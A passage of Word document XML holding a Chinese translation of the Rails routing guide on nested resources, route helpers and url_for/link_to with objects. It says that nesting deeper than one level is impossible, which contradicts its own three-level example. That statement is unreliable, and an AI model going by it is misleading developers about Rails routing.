        </w:rPr>
        <w:t>AdsController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。 这时候每一组 ad 都需要指定一个 magzine 作为前缀。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1304"/>
        <w:gridCol w:w="4536"/>
        <w:gridCol w:w="1056"/>
        <w:gridCol w:w="1626"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="39A45CD6" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="58F8244A"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HTTP Verb </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="42950552"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Path </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69F9FDD8"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action </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="368C2641"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used for </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3483D716" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="718A53A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62B9478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/magazines/:magazine_id/ads </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="78F9CFB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index </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22A1CEB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display a list of all ads for a specific magazine </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4118E75E" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40DF3EF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4F7F204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/magazines/:magazine_id/ads/new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B065DD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new </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E4B12B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return an HTML form for creating a new ad belonging to a specific magazine </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3F0F7CCB" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7370DD8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POST </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4BEFA92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/magazines/:magazine_id/ads </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="443A56C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create </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D20D17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create a new ad belonging to a specific magazine </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4D0FA260" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5033600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5DF8803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/magazines/:magazine_id/ads/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="215B2E8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show </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="42157AA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display a specific ad belonging to a specific magazine </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4CD23674" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6BD515D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68B2BDB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/magazines/:magazine_id/ads/:id/edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2C24870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edit </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="105CA27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return an HTML form for editing an ad belonging to a specific magazine </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0495D82D" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="377FDDF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PATCH/PUT </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3F729D0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/magazines/:magazine_id/ads/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2AFDEE2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update </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6AA6303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update a specific ad belonging to a specific magazine </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5A83216E" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0392F06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DELETE </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="371E09F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/magazines/:magazine_id/ads/:id </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="167050E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destroy </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6DDD369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delete a specific ad belonging to a specific magazine </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="73A6612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这样生成的路由 Hepler 就会是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>magazine_ads_url</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>edit_magazine_ad_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。这个帮助方法会把第一个参数当作指定 Magazine 的实例(例如 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>magazine_ads_url(@magazine)</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50EB3B50" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>2.7.1 嵌套 Resources 的限制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4F53F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你可以把多个 Resources 一起嵌套起来。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3456"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="64DE5794" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D55E84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resources :publishers</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43BCBDD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:magazines</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3ACBB6F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:photos</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34374E7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48C912A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40D2B5B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但是多层的嵌套很快会让你的路由变得笨重。例如上面那个例子里，你需要这样来访问一个照片：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E91E500" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53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6E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/publishers/1/magazines/2/photos/3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E0B21B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相关的路由 helper 会变成 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>publisher_magazine_photo_url</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，而且需要在参数中传入指定的每一个实例。事实上，这种令人郁闷的情形已经被很多人讨论过了，Jamis Buck 在 </w:t>
      </w:r>
      <w:hyperlink r:id="rId395" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>这里</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 有一份很火的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Rails 路由设计简则</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，这个问题或许可以在那里找到答案。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C18645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i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>事实上，你无法建立超过一层深的嵌套 Resources.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECDF36A"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2.8 从对象到路径 URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DFFD78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关于 路由 Helper, Rails 还可以通过传入一组参数来建立 路径或 URL，例如，你设置了这样的一组路由：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2976"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="59C3B27F" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2AFBAAA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resources :magazines</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13CEE8B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:ads</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03C28DB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43A3862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当你使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>magazine_ad_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 时，你可以把 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Magazine</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Ad</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 实例传入作参数来作为 ID。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7536"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="67A6C2B0" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="735D9194" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1343432932"/>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link_to "Ad details", magazine_ad_path(@magazine, @ad) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0387D7B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你也可以用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>url_for</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 带上一组对象，Rails 将会自动地生成正确的路由。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6696"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="139A2AA4" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D6C6CE4" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1200514608"/>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link_to "Ad details", url_for([@magazine, @ad]) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1C6297D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在这里，Rails 将会把 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@magazine</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对应到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Magazine</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">， </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>@ad</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对应到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Ad</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 上去，然后决定使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>magazine_ad_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这个 Helper。而如果你用的是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>link_to</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样的Helper，你可以和调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>url_for</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 一样用对象作参数:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5616"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4202FB54" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0D66F649" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="609900776"/>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link_to "Ad details", [@magazine, @ad] %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="077090D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如果你并没有用嵌套式的路由，只要这样就可以访问一个对象的 show 方法：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5496"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="6D709B88" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="047090D3" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="413867090"/>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link_to "Magazine details", @magazine</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
